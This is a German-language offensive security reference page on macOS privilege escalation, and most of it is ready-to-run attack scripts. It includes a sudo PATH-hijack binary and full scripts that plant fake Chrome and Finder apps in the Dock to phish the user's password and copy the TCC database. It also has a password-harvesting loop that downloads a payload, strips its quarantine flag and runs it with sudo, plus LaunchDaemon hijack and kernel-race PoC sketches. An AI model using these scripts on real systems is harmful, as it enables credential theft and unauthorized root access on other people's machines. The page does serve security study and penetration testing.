# macOS Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

## TCC Privilege Escalation

Wenn du hierher gekommen bist, um TCC Privilege Escalation zu finden, gehe zu:


{{#ref}}
macos-security-protections/macos-tcc/
{{#endref}}

## Linux Privesc

Bitte beachte, dass **die meisten Tricks zur privilege escalation, die Linux/Unix betreffen, auch MacOS-Maschinen betreffen**. Siehe:


{{#ref}}
../../linux-hardening/privilege-escalation/
{{#endref}}

## Benutzerinteraktion

### Sudo Hijacking

Die ursprüngliche [Sudo Hijacking technique inside the Linux Privilege Escalation post](../../linux-hardening/privilege-escalation/index.html#sudo-hijacking) findest du dort.

Allerdings behält macOS **maintains** den `PATH` des Benutzers bei, wenn er `sudo` ausführt. Das bedeutet, dass eine weitere Möglichkeit, diesen Angriff durchzuführen, darin besteht, **hijack other binaries**, die das Opfer beim **running sudo** ausführt:
```bash
# Let's hijack ls in /opt/homebrew/bin, as this is usually already in the users PATH
cat > /opt/homebrew/bin/ls <<'EOF'
#!/bin/bash
if [ "$(id -u)" -eq 0 ]; then
whoami > /tmp/privesc
fi
/bin/ls "$@"
EOF
chmod +x /opt/homebrew/bin/ls

# victim
sudo ls
```
Beachte, dass ein Benutzer, der das Terminal nutzt, sehr wahrscheinlich **Homebrew installiert** hat. Daher ist es möglich, Binärdateien in **`/opt/homebrew/bin`** zu hijacken.

### Dock Impersonation

Mit etwas **social engineering** könntest du **impersonate for example Google Chrome** im Dock und so tatsächlich dein eigenes Skript ausführen:

{{#tabs}}
{{#tab name="Chrome Impersonation"}}
Einige Vorschläge:

- Prüfe im Dock, ob ein Chrome vorhanden ist, und entferne in diesem Fall diesen Eintrag und füge den **gefälschten** **Chrome-Eintrag an derselben Position** im Dock-Array hinzu.

<details>
<summary>Chrome Dock impersonation script</summary>
```bash
#!/bin/sh

# THIS REQUIRES GOOGLE CHROME TO BE INSTALLED (TO COPY THE ICON)
# If you want to removed granted TCC permissions: > delete from access where client LIKE '%Chrome%';

rm -rf /tmp/Google\ Chrome.app/ 2>/dev/null

# Create App structure
mkdir -p /tmp/Google\ Chrome.app/Contents/MacOS
mkdir -p /tmp/Google\ Chrome.app/Contents/Resources

# Payload to execute
cat > /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome.c <<'EOF'
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main() {
char *cmd = "open /Applications/Google\\\\ Chrome.app & "
"sleep 2; "
"osascript -e 'tell application \"Finder\"' -e 'set homeFolder to path to home folder as string' -e 'set sourceFile to POSIX file \"/Library/Application Support/com.apple.TCC/TCC.db\" as alias' -e 'set targetFolder to POSIX file \"/tmp\" as alias' -e 'duplicate file sourceFile to targetFolder with replacing' -e 'end tell'; "
"PASSWORD=$(osascript -e 'Tell application \"Finder\"' -e 'Activate' -e 'set userPassword to text returned of (display dialog \"Enter your password to update Google Chrome:\" default answer \"\" with hidden answer buttons {\"OK\"} default button 1 with icon file \"Applications:Google Chrome.app:Contents:Resources:app.icns\")' -e 'end tell' -e 'return userPassword'); "
"echo $PASSWORD > /tmp/passwd.txt";
system(cmd);
return 0;
}
EOF

gcc /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome.c -o /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome
rm -rf /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome.c

chmod +x /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome

# Info.plist
cat << 'EOF' > /tmp/Google\ Chrome.app/Contents/Info.plist
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN"
"http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>CFBundleExecutable</key>
<string>Google Chrome</string>
<key>CFBundleIdentifier</key>
<string>com.google.Chrome</string>
<key>CFBundleName</key>
<string>Google Chrome</string>
<key>CFBundleVersion</key>
<string>1.0</string>
<key>CFBundleShortVersionString</key>
<string>1.0</string>
<key>CFBundleInfoDictionaryVersion</key>
<string>6.0</string>
<key>CFBundlePackageType</key>
<string>APPL</string>
<key>CFBundleIconFile</key>
<string>app</string>
</dict>
</plist>
EOF

# Copy icon from Google Chrome
cp /Applications/Google\ Chrome.app/Contents/Resources/app.icns /tmp/Google\ Chrome.app/Contents/Resources/app.icns

# Add to Dock
defaults write com.apple.dock persistent-apps -array-add '<dict><key>tile-data</key><dict><key>file-data</key><dict><key>_CFURLString</key><string>/tmp/Google Chrome.app</string><key>_CFURLStringType</key><integer>0</integer></dict></dict></dict>'
sleep 0.1
killall Dock
```
</details>

{{#endtab}}

{{#tab name="Finder Impersonation"}}
Einige Vorschläge:

- Du **kannst Finder nicht aus dem Dock entfernen**, daher, wenn du ihn dem Dock hinzufügen willst, könntest du den gefälschten Finder direkt neben dem echten platzieren. Dafür musst du **den gefälschten Finder-Eintrag am Anfang des Dock-Arrays hinzufügen**.
- Eine andere Möglichkeit ist, ihn nicht ins Dock zu legen und einfach zu öffnen; "Finder asking to control Finder" wirkt nicht so seltsam.
- Eine weitere Option, **auf root zu eskalieren, ohne zu fragen** (also ohne ein hässliches Passwortfenster), besteht darin, Finder wirklich nach dem Passwort fragen zu lassen, um eine privilegierte Aktion durchzuführen:
- Fordere Finder auf, eine neue **`sudo`**-Datei nach **`/etc/pam.d`** zu kopieren (die Passwortabfrage wird anzeigen, dass "Finder wants to copy sudo")
- Fordere Finder auf, ein neues **Authorization Plugin** zu kopieren (du könntest den Dateinamen kontrollieren, sodass die Passwortabfrage anzeigt, dass "Finder wants to copy Finder.bundle")

<details>
<summary>Finder Dock impersonation script</summary>
```bash
#!/bin/sh

# THIS REQUIRES Finder TO BE INSTALLED (TO COPY THE ICON)
# If you want to removed granted TCC permissions: > delete from access where client LIKE '%finder%';

rm -rf /tmp/Finder.app/ 2>/dev/null

# Create App structure
mkdir -p /tmp/Finder.app/Contents/MacOS
mkdir -p /tmp/Finder.app/Contents/Resources

# Payload to execute
cat > /tmp/Finder.app/Contents/MacOS/Finder.c <<'EOF'
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main() {
char *cmd = "open /System/Library/CoreServices/Finder.app & "
"sleep 2; "
"osascript -e 'tell application \"Finder\"' -e 'set homeFolder to path to home folder as string' -e 'set sourceFile to POSIX file \"/Library/Application Support/com.apple.TCC/TCC.db\" as alias' -e 'set targetFolder to POSIX file \"/tmp\" as alias' -e 'duplicate file sourceFile to targetFolder with replacing' -e 'end tell'; "
"PASSWORD=$(osascript -e 'Tell application \"Finder\"' -e 'Activate' -e 'set userPassword to text returned of (display dialog \"Finder needs to update some components. Enter your password:\" default answer \"\" with hidden answer buttons {\"OK\"} default button 1 with icon file \"System:Library:CoreServices:Finder.app:Contents:Resources:Finder.icns\")' -e 'end tell' -e 'return userPassword'); "
"echo $PASSWORD > /tmp/passwd.txt";
system(cmd);
return 0;
}
EOF

gcc /tmp/Finder.app/Contents/MacOS/Finder.c -o /tmp/Finder.app/Contents/MacOS/Finder
rm -rf /tmp/Finder.app/Contents/MacOS/Finder.c

chmod +x /tmp/Finder.app/Contents/MacOS/Finder

# Info.plist
cat << 'EOF' > /tmp/Finder.app/Contents/Info.plist
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN"
"http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>CFBundleExecutable</key>
<string>Finder</string>
<key>CFBundleIdentifier</key>
<string>com.apple.finder</string>
<key>CFBundleName</key>
<string>Finder</string>
<key>CFBundleVersion</key>
<string>1.0</string>
<key>CFBundleShortVersionString</key>
<string>1.0</string>
<key>CFBundleInfoDictionaryVersion</key>
<string>6.0</string>
<key>CFBundlePackageType</key>
<string>APPL</string>
<key>CFBundleIconFile</key>
<string>app</string>
</dict>
</plist>
EOF

# Copy icon from Finder
cp /System/Library/CoreServices/Finder.app/Contents/Resources/Finder.icns /tmp/Finder.app/Contents/Resources/app.icns

# Add to Dock
defaults write com.apple.dock persistent-apps -array-add '<dict><key>tile-data</key><dict><key>file-data</key><dict><key>_CFURLString</key><string>/tmp/Finder.app</string><key>_CFURLStringType</key><integer>0</integer></dict></dict></dict>'
sleep 0.1
killall Dock
```
</details>

{{#endtab}}
{{#endtabs}}

### Password prompt phishing + sudo reuse

Malware missbraucht häufig Benutzerinteraktion, um ein **sudo-fähiges Passwort** abzugreifen und programmgesteuert wiederzuverwenden. Ein typischer Ablauf:

1. Ermitteln des angemeldeten Benutzers mit `whoami`.
2. **Passwortabfragen in einer Schleife** wiederholen, bis `dscl . -authonly "$user" "$pw"` Erfolg zurückgibt.
3. Anmeldeinformationen cachen (z. B. `/tmp/.pass`) und privilegierte Aktionen mit `sudo -S` ausführen (Passwort über stdin).

Beispiel einer minimalen Kette:
```bash
user=$(whoami)
while true; do
read -s -p "Password: " pw; echo
dscl . -authonly "$user" "$pw" && break
done
printf '%s\n' "$pw" > /tmp/.pass
curl -o /tmp/update https://example.com/update
printf '%s\n' "$pw" | sudo -S xattr -c /tmp/update && chmod +x /tmp/update && /tmp/update
```
Das gestohlene Passwort kann dann wiederverwendet werden, um **die Gatekeeper-Quarantäne mit `xattr -c` zu entfernen**, LaunchDaemons oder andere privilegierte Dateien zu kopieren und zusätzliche Stages nicht-interaktiv auszuführen.

## Neuere macOS-spezifische Vektoren (2023–2025)

### Veraltete `AuthorizationExecuteWithPrivileges` weiterhin nutzbar

`AuthorizationExecuteWithPrivileges` wurde in 10.7 als veraltet markiert, funktioniert aber **immer noch unter Sonoma/Sequoia**. Viele kommerzielle Updater rufen `/usr/libexec/security_authtrampoline` mit einem nicht vertrauenswürdigen Pfad auf. Wenn die Ziel-Binary vom Benutzer beschreibbar ist, kannst du einen Trojaner platzieren und die legitime Eingabeaufforderung ausnutzen:
```bash
# find vulnerable helper calls
log stream --info --predicate 'eventMessage CONTAINS "security_authtrampoline"'

# replace expected helper
cp /tmp/payload /Users/me/Library/Application\ Support/Target/helper
chmod +x /Users/me/Library/Application\ Support/Target/helper
# when the app updates, the root prompt spawns your payload
```
Kombiniere das mit den **masquerading tricks above**, um einen glaubwürdigen Passwortdialog zu präsentieren.

### LaunchDaemon plist hijack (CVE-2025-24085 pattern)

Wenn eine LaunchDaemon plist oder deren `ProgramArguments`-Ziel **user-writable** ist, kannst du eskalieren, indem du sie austauschst und dann launchd zum Neuladen zwingst:
```bash
sudo launchctl bootout system /Library/LaunchDaemons/com.apple.securemonitor.plist
cp /tmp/root.sh /Library/PrivilegedHelperTools/securemonitor
chmod 755 /Library/PrivilegedHelperTools/securemonitor
cat > /Library/LaunchDaemons/com.apple.securemonitor.plist <<'PLIST'
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0"><dict>
<key>Label</key><string>com.apple.securemonitor</string>
<key>ProgramArguments</key>
<array><string>/Library/PrivilegedHelperTools/securemonitor</string></array>
<key>RunAtLoad</key><true/>
</dict></plist>
PLIST
sudo launchctl bootstrap system /Library/LaunchDaemons/com.apple.securemonitor.plist
```
Dies spiegelt das für **CVE-2025-24085** veröffentlichte Exploit-Muster wider, bei dem eine beschreibbare plist missbraucht wurde, um Angreifer-Code als root auszuführen.

### XNU SMR credential race (CVE-2025-24118)

Ein **race in `kauth_cred_proc_update`** ermöglicht einem lokalen Angreifer, den schreibgeschützten Credential-Zeiger (`proc_ro.p_ucred`) zu korrumpieren, indem `setgid()`/`getgid()`-Schleifen über Threads gegeneinander ausgeführt werden, bis ein zerrissener `memcpy` auftritt. Erfolgreiche Korruption liefert **uid 0** und Zugriff auf Kernel-Speicher. Minimale PoC-Struktur:
```c
// thread A
while (1) setgid(rand());
// thread B
while (1) getgid();
```
Kombiniert mit heap grooming, um kontrollierte Daten dort zu platzieren, wo der Pointer erneut eingelesen wird. Auf verwundbaren Builds ist dies ein zuverlässiger **local kernel privesc** ohne SIP-Bypass-Anforderungen.

### SIP bypass via Migration assistant ("Migraine", CVE-2023-32369)

Wenn Sie bereits root haben, verhindert SIP weiterhin Schreibzugriffe auf Systempfade. Der **Migraine**-Bug missbraucht das Migration Assistant entitlement `com.apple.rootless.install.heritable`, um einen Child-Prozess zu starten, der den SIP-Bypass erbt und geschützte Pfade überschreibt (z. B. `/System/Library/LaunchDaemons`). Die Kette:

1. Root auf einem Live-System erlangen.
2. systemmigrationd mit manipuliertem Zustand triggern, um ein von Angreifern kontrolliertes Binary auszuführen.
3. Das vererbte Entitlement verwenden, um SIP-geschützte Dateien zu patchen, sodass die Änderungen auch nach einem Neustart erhalten bleiben.

### NSPredicate/XPC expression smuggling (CVE-2023-23530/23531 bug class)

Mehrere Apple-Daemons akzeptieren **NSPredicate**-Objekte über XPC und validieren nur das Feld `expressionType`, das vom Angreifer steuerbar ist. Durch das Erstellen eines Predicates, das beliebige Selector auswertet, kann man **code execution in root/system XPC services** erzielen (z. B. `coreduetd`, `contextstored`). In Kombination mit einem initialen App-Sandbox-Escape ermöglicht dies **privilege escalation without user prompts**. Suche nach XPC-Endpunkten, die Predicates deserialisieren und keinen robusten Visitor haben.

## TCC - Root Privilege Escalation

### CVE-2020-9771 - mount_apfs TCC bypass and privilege escalation

**Jeder Benutzer** (auch unprivilegierte) kann einen Time Machine-Snapshot erstellen und mounten und **auf ALLE Dateien** dieses Snapshots zugreifen.\
Das einzige Privileg, das erforderlich ist, betrifft die verwendete Anwendung (z. B. `Terminal`): sie muss **Full Disk Access** (FDA) (`kTCCServiceSystemPolicyAllfiles`) haben, was von einem Administrator gewährt werden muss.

<details>
<summary>Time Machine-Snapshot einhängen</summary>
```bash
# Create snapshot
tmutil localsnapshot

# List snapshots
tmutil listlocalsnapshots /
Snapshots for disk /:
com.apple.TimeMachine.2023-05-29-001751.local

# Generate folder to mount it
cd /tmp # I didn it from this folder
mkdir /tmp/snap

# Mount it, "noowners" will mount the folder so the current user can access everything
/sbin/mount_apfs -o noowners -s com.apple.TimeMachine.2023-05-29-001751.local /System/Volumes/Data /tmp/snap

# Access it
ls /tmp/snap/Users/admin_user # This will work
```
</details>

Eine ausführlichere Erklärung kann [**found in the original report**](https://theevilbit.github.io/posts/cve_2020_9771/)**.**

## Sensitive Informationen

Dies kann nützlich sein, um Privilege Escalation durchzuführen:


{{#ref}}
macos-files-folders-and-binaries/macos-sensitive-locations.md
{{#endref}}

## Referenzen

- [Microsoft "Migraine" SIP bypass (CVE-2023-32369)](https://www.microsoft.com/en-us/security/blog/2023/05/30/new-macos-vulnerability-migraine-could-bypass-system-integrity-protection/)
- [CVE-2025-24118 SMR credential race write-up & PoC](https://github.com/jprx/CVE-2025-24118)

{{#include ../../banners/hacktricks-training.md}}
